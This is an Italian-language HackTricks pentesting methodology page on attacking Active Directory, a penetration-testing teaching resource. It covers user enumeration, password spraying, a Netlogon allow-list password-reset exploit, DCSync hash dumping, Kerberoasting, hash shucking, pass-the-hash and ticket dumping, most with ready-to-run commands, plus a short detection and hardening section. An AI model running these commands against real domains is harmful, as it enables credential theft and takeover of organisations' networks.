# Metodologia di Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, consentendo agli **amministratori di rete** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettato per scalare, facilitando l'organizzazione di un numero elevato di utenti in **gruppi** e **sottogruppi** gestibili, controllando al contempo i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domini**, **alberi** e **foreste**. Un **dominio** comprende una raccolta di oggetti, come **utenti** o **dispositivi**, che condividono un database comune. Gli **alberi** sono gruppi di questi domini collegati da una struttura condivisa, mentre una **foresta** rappresenta la raccolta di più alberi, interconnessi tramite **relazioni di trust**, formando il livello più alto della struttura organizzativa. A ciascuno di questi livelli possono essere assegnati specifici **diritti di accesso** e di **comunicazione**.

I concetti chiave di **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Oggetto** – Indica le entità all'interno della directory, inclusi **utenti**, **gruppi** o **cartelle condivise**.
3. **Dominio** – Funge da contenitore per gli oggetti della directory; più domini possono coesistere all'interno di una **foresta**, mantenendo ciascuno la propria raccolta di oggetti.
4. **Albero** – Un raggruppamento di domini che condividono un dominio radice comune.
5. **Foresta** – Il vertice della struttura organizzativa di Active Directory, composta da diversi alberi con **relazioni di trust** tra loro.

**Active Directory Domain Services (AD DS)** comprende una serie di servizi fondamentali per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **utenti** e **domini**, comprese le funzionalità di **autenticazione** e **ricerca**.
2. **Certificate Services** – Gestisce la creazione, la distribuzione e la gestione di **certificati digitali** sicuri.
3. **Lightweight Directory Services** – Supporta le applicazioni abilitate per le directory tramite il **protocollo LDAP**.
4. **Directory Federation Services** – Fornisce funzionalità di **single sign-on** per autenticare gli utenti su più applicazioni web in un'unica sessione.
5. **Rights Management** – Contribuisce a proteggere i materiali coperti da copyright regolandone la distribuzione e l'utilizzo non autorizzati.
6. **DNS Service** – Fondamentale per la risoluzione dei **nomi di dominio**.

Per una spiegazione più dettagliata, consulta: [**TechTerms - Definizione di Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticazione Kerberos**

Per imparare ad **attaccare un AD** è necessario **comprendere** molto bene il **processo di autenticazione Kerberos**.\
[**Leggi questa pagina se non sai ancora come funziona.**](kerberos-authentication.md)

## Cheat Sheet

Puoi consultare [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una panoramica rapida dei comandi che puoi eseguire per enumerare/effettuare l'exploit di un AD.

> [!WARNING]
> La comunicazione Kerberos normalmente **richiede un fully qualified domain name (FQDN)** affinché il client possa ottenere un ticket per lo SPN corretto. L'accesso a una macchina tramite indirizzo IP ricade comunemente su NTLM invece che su Kerberos.

## Recon di Active Directory (senza credenziali/sessioni)

Se hai soltanto accesso a un ambiente AD, ma non disponi di credenziali/sessioni, potresti:

- **Fare il pentest della rete:**
- Scansionare la rete, trovare macchine e porte aperte e provare a **sfruttare le vulnerabilità** o **estrarre credenziali** da esse (ad esempio, [le stampanti possono essere obiettivi molto interessanti](ad-information-in-printers.md)).
- L'enumerazione del DNS potrebbe fornire informazioni sui server principali del dominio, come web, stampanti, share, VPN, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulta la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) generale per trovare maggiori informazioni su come farlo.
- **Verificare l'accesso null e Guest sui servizi SMB** (non funzionerà nelle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB è disponibile qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP è disponibile qui (presta **particolare attenzione all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Avvelenare la rete**
- Raccogliere credenziali [**impersonando servizi con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Ottenere accesso all'host [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogliere credenziali **esponendo** [**servizi UPnP falsi con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrarre nomi utente/nomi da documenti interni, social media e servizi (principalmente web) all'interno degli ambienti del dominio, oltre che dalle fonti disponibili pubblicamente.
- Se trovi i nomi completi dei dipendenti dell'azienda, potresti provare diverse **convenzioni per i nomi utente di AD (**[**leggi qui**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascun nome), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettere casuali e 3 numeri casuali_ (abc123).
- Strumenti:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerazione degli utenti

- **Enumerazione SMB/LDAP anonima:** consulta le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumerazione con Kerbrute**: quando viene richiesto un **nome utente non valido**, il server risponde utilizzando il codice di **errore Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permettendoci di determinare che il nome utente non è valido. I **nomi utente validi** genereranno una risposta contenente il **TGT in un AS-REP** oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente deve eseguire la pre-autenticazione.
- **Nessuna autenticazione tramite MS-NRPC**: utilizzo di auth-level = 1 (nessuna autenticazione) sull'interfaccia MS-NRPC (Netlogon) dei domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo il binding all'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca è disponibile [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Server OWA (Outlook Web Access)**

Se hai trovato uno di questi server nella rete, puoi anche eseguire l'**enumeration degli utenti su di esso**. Ad esempio, potresti usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare elenchi di nomi utente in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere i **nomi delle persone che lavorano nell'azienda** ottenuti durante la fase di recon che dovresti aver eseguito prima di questa. Con nome e cognome potresti usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali nomi utente validi.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Anche dopo che **Zerologon** è stato corretto sul DC, gli account esplicitamente presenti nell'allow-list possono ancora essere esposti al comportamento **legacy/vulnerable** del secure channel di Netlogon. La configurazione rischiosa è il GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o il valore di registro corrispondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Quel valore è un **security descriptor SDDL** (vedi [Security Descriptors](security-descriptors.md)). Qualsiasi account o gruppo a cui sia stata assegnata l'ACE pertinente nella DACL può essere preso di mira. Ad esempio, `O:BAG:BAD:(A;;RC;;;WD)` inserisce di fatto **Everyone** nell'allow-list.

Workflow pratico dell'operatore:

1. **Identifica i principal presenti nell'allow-list** controllando sia **SYSVOL/GPO** sia il **registro live del DC**.
2. **Risolvi i SID** trovati nell'SDDL in utenti/computer AD reali e assegna priorità agli **account macchina dei DC**, agli **account di trust** e ad altri computer privilegiati.
3. Tenta ripetutamente l'**autenticazione MS-NRPC / Netlogon** usando l'account presente nell'allow-list.
4. Dopo un tentativo riuscito, abusa della funzionalità **Netlogon password-setting** per reimpostare la password dell'account target (il PoC pubblico la imposta su una stringa vuota).<sup>[[9]](#references)[[10]](#references)</sup>

Esempi rapidi di triage / laboratorio dall'artefatto pubblico:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Note:

- Lo **scanner** è utile perché l’allow-list effettiva può trovarsi in **SYSVOL**, nel **registry** o in entrambi.
- Il percorso di exploit è importante perché **non richiede privilegi di Domain Admin** una volta identificato un account vulnerabile.
- Compromettere un **Domain Controller machine account** come `DC$` è particolarmente pericoloso, perché il reset di quella password può abilitare direttamente percorsi più ampi di **AD takeover**.
- La fattibilità del **brute-force** dipende dalla modalità: l’artifact pubblico descrive un approccio meet-in-the-middle, un **brute force a 24 bit** quando è disponibile un altro computer account e varianti **a 32 bit** più lente.

Note su detection / hardening:

- Verifica la policy dell’allow-list e rimuovi tutto ciò che non sia un’eccezione temporanea e richiesta esplicitamente per motivi di compatibilità.
- Monitora gli eventi **System** dei DC **5827/5828/5829/5830/5831** per rilevare connessioni Netlogon vulnerabili negate, individuate o consentite esplicitamente dalla policy.
- Considera gli account in `VulnerableChannelAllowList` come **ad alto rischio** finché la dipendenza legacy non viene rimossa.

### Conoscere uno o più username

Ok, quindi sai di avere già uno username valido ma nessuna password... Allora prova:

- [**ASREPRoast**](asreproast.md): se un utente **non ha** l’attributo _DONT_REQ_PREAUTH_, puoi **richiedere un messaggio AS_REP** per quell’utente, che conterrà dati cifrati tramite una derivazione della password dell’utente.
- [**Password Spraying**](password-spraying.md): proviamo le **password più comuni** con ciascuno degli utenti individuati; magari qualche utente sta usando una password debole (tieni presente la password policy!).
- Nota che puoi anche fare **spraying sui server OWA** per tentare di ottenere accesso ai mail server degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti riuscire a **ottenere** alcuni **hash** di challenge facendo **poisoning** di alcuni protocolli della **rete**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

L’enumeration di Active Directory fornisce account, host e servizi candidati che possono essere costretti ad autenticarsi. Usa questo contesto per identificare possibili [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM e potenziali percorsi verso l’ambiente AD.

### Recon e verifiche della relay posture basate sui workspace di NetExec

- Usa i **workspace `nxcdb`** per mantenere lo stato della recon AD separato per ogni engagement: `workspace create <name>` genera database SQLite per-protocollo in `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/ecc.). Cambia visualizzazione con `proto smb|mssql|winrm` ed elenca i secret raccolti con `creds`. Elimina manualmente i dati sensibili al termine: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La discovery rapida della subnet con **`netexec smb <cidr>`** mostra **domain**, **OS build**, **SMB signing requirements** e **Null Auth**. I membri che mostrano `(signing:False)` sono **relay-prone**, mentre i DC spesso richiedono il signing.
- Genera gli **hostname in /etc/hosts** direttamente dall’output di NetExec per semplificare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay to the DC is blocked** dal signing, verifica comunque il **LDAP** posture: `netexec ldap <dc>` evidenzia `(signing:None)` / un weak channel binding. Un DC con SMB signing richiesto ma LDAP signing disabilitato rimane un target valido per **relay-to-LDAP** e abusi come **SPN-less RBCD**.

### Client-side printer credential leaks → validazione massiva delle credenziali del dominio

- Le UI delle printer a volte **incorporano password admin mascherate nell'HTML**. Visualizzare il source/devtools può rivelare il cleartext (ad es. `<input value="<password>">`), consentendo l'accesso tramite Basic-auth ai repository di scansione/stampa.
- I print job recuperati possono contenere **documenti di onboarding in plaintext** con password specifiche per utente. Mantieni allineate le coppie durante i test:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** con l'utente **null o guest**, potresti **posizionare file** (come un file SCF) che, se in qualche modo aperti, **attiveranno un'autenticazione NTLM verso di te**, permettendoti di **rubare** la **challenge NTLM** per effettuare il cracking:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni hash NT già in tuo possesso come una password candidata per altri formati più lenti, il cui materiale crittografico viene derivato direttamente dall'hash NT. Invece di effettuare il brute-force di passphrase lunghe nei ticket Kerberos RC4, nelle challenge NetNTLM o nelle cached credentials, fornisci gli hash NT alle modalità NT-candidate di Hashcat e lasci che verifichi il riutilizzo della password senza dover mai conoscere il plaintext. Questa tecnica è particolarmente efficace dopo la compromissione di un dominio, quando puoi raccogliere migliaia di hash NT attuali e storici.<sup>[[5]](#references)</sup>

Usa lo shucking quando:

- Hai un corpus di hash NT ottenuto da DCSync, dump SAM/SECURITY o credential vault e devi verificare il riutilizzo in altri domini/foreste.
- Acquisisci materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM o blob DCC/DCC2.
- Vuoi dimostrare rapidamente il riutilizzo di passphrase lunghe e non crackabili e fare immediatamente pivot tramite Pass-the-Hash.

La tecnica **non funziona** contro i tipi di cifratura le cui chiavi non sono l'hash NT (ad esempio Kerberos etype 17/18 AES). Se un dominio impone esclusivamente AES, devi tornare alle normali modalità per password.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con la history per ottenere il set più ampio possibile di hash NT (e i relativi valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci della history ampliano notevolmente il pool di candidati, perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per ulteriori metodi di raccolta dei secrets NTDS, vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oppure Mimikatz `lsadump::sam /patch`) estrae i dati SAM/SECURITY locali e i cached domain logons (DCC/DCC2). Rimuovi i duplicati e aggiungi questi hash alla stessa lista `nt_candidates.txt`.
- **Track metadata** – Conserva il nome utente/dominio che ha prodotto ogni hash (anche se la wordlist contiene solo valori esadecimali). Gli hash corrispondenti ti indicano immediatamente quale principal sta riutilizzando una password quando Hashcat mostra il candidato vincente.
- Preferisci candidati provenienti dalla stessa foresta o da una foresta trusted; in questo modo massimizzi la probabilità di sovrapposizione durante lo shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Note:

- Gli input NT-candidate **devono rimanere hash NT grezzi di 32 caratteri esadecimali**. Disabilita i rule engine (nessun `-r` e nessuna modalità hybrid), perché il mangling corrompe il materiale della chiave candidata.
- Queste modalità non sono intrinsecamente più veloci, ma il keyspace NTLM (~30.000 MH/s su un M3 Max) è circa 100 volte più rapido di Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto più economico che esplorare l'intero spazio delle password nel formato più lento.
- Esegui sempre l'ultima build di Hashcat (`git clone https://github.com/hashcat/hashcat && make install`), perché le modalità 31500/31600/35300/35400 sono state introdotte recentemente.<sup>[[7]](#references)</sup>
- Attualmente non esiste una modalità NT per AS-REQ Pre-Auth, mentre gli etype AES (19600/19700) richiedono la password in plaintext, poiché le relative chiavi vengono derivate tramite PBKDF2 da password UTF-16LE, non da hash NT grezzi.

#### Example – Kerberoast RC4 (mode 35300)

1. Acquisisci un TGS RC4 per un SPN target con un utente a bassi privilegi (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Esegui lo shucking del ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni candidato NT e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che il service account utilizza uno degli hash NT già in tuo possesso.

3. Fai immediatamente pivot tramite PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Facoltativamente, puoi recuperare in seguito il plaintext con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Example – Cached credentials (mode 31600)

1. Esegui il dump dei cached logon da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 dell'utente del dominio interessato in `dcc2_highpriv.txt` ed esegui lo shucking:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza riuscita restituisce l'hash NT già noto nella tua lista, dimostrando che l'utente in cache sta riutilizzando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oppure esegui il brute-force in modalità NTLM veloce per recuperare la stringa.

Lo stesso workflow si applica alle challenge-response NetNTLM (`-m 27000/27100`) e a DCC (`-m 31500`). Una volta identificata una corrispondenza, puoi avviare relay, PtH tramite SMB/WMI/WinRM oppure eseguire nuovamente il cracking dell'hash NT offline usando masks/rules.



## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credenziali o una sessione di un account di dominio valido**. Se disponi di credenziali valide o di una shell come utente di dominio, **ricorda che le opzioni indicate in precedenza sono ancora utilizzabili per compromettere altri utenti**.

Prima di iniziare l'enumeration autenticata, comprendi il **problema del double-hop di Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Compromettere un account è un **passo importante per valutare il dominio**, perché consente di eseguire l'**enumeration autenticata di Active Directory**:

Per quanto riguarda [**ASREPRoast**](asreproast.md), ora puoi trovare ogni possibile utente vulnerabile; per quanto riguarda il [**Password Spraying**](password-spraying.md), puoi ottenere un **elenco di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password promettenti.

- Puoi usare il [**CMD per eseguire una recon di base**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell per la recon**](../basic-powershell-for-pentesters/index.html), che sarà più stealthy
- Puoi anche [**usare powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro strumento eccezionale per la recon in un active directory è [**BloodHound**](bloodhound.md). È **poco stealthy** (a seconda dei metodi di collection utilizzati), ma **se non ti interessa**, dovresti assolutamente provarlo. Individua dove gli utenti possono usare RDP, trova il percorso verso altri gruppi, ecc.
- **Altri strumenti automatizzati per l'enumeration di AD sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**I record DNS dell'AD**](ad-dns-records.md), poiché potrebbero contenere informazioni interessanti.
- Uno **strumento con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** della suite **SysInternal**.
- Puoi anche cercare nel database LDAP con **ldapsearch** per trovare credenziali nei campi _userPassword_ e _unixUserPassword_, oppure anche in _Description_. Vedi [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se usi **Linux**, puoi anche enumerare il dominio tramite [**pywerview**](https://github.com/the-useless-one/pywerview).
- Puoi anche provare strumenti automatizzati come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Estrazione di tutti gli utenti del dominio**

È molto semplice ottenere tutti gli username del dominio da Windows (`net user /domain`, `Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oppure `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione sull'Enumeration sembra breve, è la parte più importante di tutte. Apri i link (soprattutto quelli relativi a cmd, powershell, powerview e BloodHound), impara a enumerare un dominio ed esercitati finché non ti sentirai a tuo agio. Durante un assessment, questo sarà il momento decisivo per trovare la strada verso DA o per stabilire che non è possibile fare nulla.

### Kerberoast

Il Kerberoasting consiste nell'ottenere **ticket TGS** utilizzati dai servizi associati agli account utente ed eseguire il cracking della loro cifratura, basata sulle password degli utenti, **offline**.

Per maggiori informazioni:

 
{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Dopo aver ottenuto alcune credenziali, puoi verificare se hai accesso a una **machine**. A tale scopo, puoi usare **CrackMapExec** per tentare la connessione a diversi server con protocolli differenti, in base alle scansioni delle porte.

### Local Privilege Escalation

Se hai compromesso credenziali o una sessione come utente di dominio normale e puoi accedere a **qualsiasi machine nel dominio**, cerca un percorso per **eseguire l'escalation dei privilegi localmente e raccogliere credenziali**. I privilegi di amministratore locale possono consentirti di **eseguire il dump degli hash di altri utenti** dalla memoria (LSASS) e dallo storage locale (SAM).

In questo libro è disponibile una pagina completa sull'[**escalation dei privilegi locale in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È **molto improbabile** trovare **ticket** nell'**utente corrente** che ti diano il **permesso di accedere** a risorse inaspettate, ma puoi verificare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Con credenziali di dominio o una sessione utente, riesamina gli [**attacchi di relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: le tecniche di enumerazione autenticata e coercizione possono esporre percorsi di relay che non erano disponibili durante la ricognizione non autenticata.

### Ricerca di Credenziali nelle Condivisioni dei Computer | Condivisioni SMB

Ora che disponi di alcune credenziali di base, dovresti verificare se riesci a **trovare** **file interessanti condivisi all'interno dell'AD**. Potresti farlo manualmente, ma è un'attività molto noiosa e ripetitiva (soprattutto se trovi centinaia di documenti da controllare).

[**Segui questo link per scoprire quali strumenti puoi usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Rubare Credenziali NTLM

Se puoi **accedere ad altri PC o condivisioni**, potresti **posizionare file** (come un file SCF) che, se in qualche modo vi si accede, **attiveranno un'autenticazione NTLM contro di te**, permettendoti di **rubare** la **challenge NTLM** per sottoporla a cracking:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation su Active Directory CON credenziali/sessione privilegiata

**Per le tecniche seguenti un normale utente di dominio non è sufficiente: sono necessari privilegi/credenziali speciali per eseguire questi attacchi.**

### Estrazione degli hash

Si spera che tu sia riuscito a **compromettere** qualche account di **amministratore locale** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluso il relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [l'escalation dei privilegi in locale](../windows-local-privilege-escalation/index.html).\
A questo punto, è il momento di eseguire il dump di tutti gli hash presenti in memoria e localmente.\
[**Leggi questa pagina sui diversi modi per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta ottenuto l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare uno **strumento** che **esegua** l'**autenticazione NTLM usando** quell'**hash**, **oppure** puoi creare una nuova **sessionlogon** e **iniettare** quell'**hash** all'interno di **LSASS**, in modo che, quando viene eseguita un'autenticazione **NTLM**, venga usato quell'**hash**. L'ultima opzione è quella utilizzata da mimikatz.\
[**Leggi questa pagina per ulteriori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **usare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash sul protocollo NTLM. Pertanto, può essere particolarmente **utile nelle reti in cui il protocollo NTLM è disabilitato** e come protocollo di autenticazione è consentito solo **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nel metodo di attacco **Pass The Ticket (PTT)**, gli attaccanti **rubano il ticket di autenticazione di un utente** invece della sua password o dei suoi valori hash. Questo ticket rubato viene quindi usato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Riutilizzo delle credenziali

Se possiedi l'**hash** o la **password** di un **amministratore locale**, dovresti provare a **eseguire il login localmente** su altri **PC** usando tali credenziali.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### Abuso di MSSQL e Trusted Links

Se un utente dispone dei privilegi per **accedere alle istanze MSSQL**, potrebbe essere in grado di utilizzarle per **eseguire comandi** nell'host MSSQL (se in esecuzione come SA), **rubare** l'**hash** NetNTLM o persino eseguire un **relay** **attack**.\
Se un'istanza MSSQL è considerata attendibile tramite un collegamento al database da parte di un'altra istanza, un utente con privilegi sul database collegato potrebbe essere in grado di **utilizzare la relazione di trust per eseguire query sull'altra istanza**. Questi trust possono essere concatenati e potrebbero infine raggiungere un database configurato in modo errato, dove l'utente può eseguire comandi.\
**I collegamenti tra database funzionano anche attraverso i forest trust.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso delle piattaforme IT di inventario/deployment

Le suite di inventory e deployment di terze parti spesso espongono percorsi potenti verso le credenziali e l'esecuzione di codice. Vedi:

{{#ref}}
